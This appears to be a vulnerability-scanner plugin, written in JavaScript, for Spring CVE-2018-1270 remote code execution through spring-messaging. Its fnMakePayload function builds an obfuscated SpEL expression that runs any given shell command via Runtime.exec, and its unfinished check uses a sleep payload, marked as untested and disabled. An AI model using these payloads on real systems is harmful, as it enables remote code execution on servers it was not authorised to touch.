// 还没有成功测试
module.exports={
	tags: "spring,CVE-2018-1270,1270,parms,web",
	des: "spring CVE-2018-1270 RCEVulnerability detection,CVE-2018-1270: Remote Code Execution with spring-messaging",
	dependencies:"",
	VulApps:[
		"https://pivotal.io/security/cve-2018-1270"
	],
	urls:[
		"https://github.com/CaledoniaProject/CVE-2018-1270",
		"https://www.anquanke.com/post/id/104926",
		"http://deadpool.sh/2017/RCE-Springs/"
	],
	fnMakePayload:function(szCmd)
	{
		var a = ["${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(",
		""
		,").getInputStream())}"],x = szCmd.split(""), szT = "";
		for(var i = 0; i < x.length; i++)
		{
			if(0 < i)szT += ".concat(";
			szT += "T(java.lang.Character).toString(" + x[i].charCodeAt(0) + ")";
			if(0 < i)szT += ")";
		}
		a[1] = szT;
		return a.join("")
	},
/*
git clone https://github.com/CaledoniaProject/CVE-2018-1270.git
cd CVE-2018-1270
mvn clean package
java -jar target/spring-boot-websocket-1.0.jar

*/
	doCheck:function (url,fnCbk,parms)
	{
		if(true)return fnCbk({},this);// 未测试成功
		var _t = this,_s = _t.self, s = '',hst = _s.parseUrl(url),
			nNum = new Date().getTime()/1000,// 延时测试
			nTime = (parseInt(Math.random() * 1000000000)%18 + 15) * 1000,bHv = false,
			szPayload = _s.fnMyHelp(function()
{
/*
T(java.lang.Thread).sleep(nTime)
*/
});
		parms || (parms={});
		szPayload = szPayload.replace(/nTime/gmi,nTime);
		// console.log(hst);
		// var Stomp = require(__dirname + '/../../commonlib/Stomp.js'),run = function()
		// {
		//   selector = szPayload;
		//   stompClient = Stomp.client('ws://' + hst.host + '' + hst.path);
		//   stompClient.connect({}, function(frame) {
		//     stompClient.subscribe('/topic/greetings', function()
		//     {
		//     	var nT = new Date().getTime()/1000 - nNum,nT2 = nTime / 1000 - 5;
		// 	  	r = {
		//     			"url":url,
		//     			"send":s,
		//     			tags:_t.tags,
		//     			href:response && response.request.uri.href||''};
		// 	  	if(nT >= nT2)
		//     	{
		//     		r.vul = true;
		//     		r.des = "发现spring,CVE-2018-1270高危远程代码执行漏洞, 延时" + (nTime/1000) + "秒，实际返回耗时：" + nT + "秒";
		//     		fnCbk(r,_t);
		//     	}
		// 	  	else fnCbk(r,_t);
		//     }, {"selector": selector})
		//   });
		// };
		
		var szOldUrl = url;
		
	}
};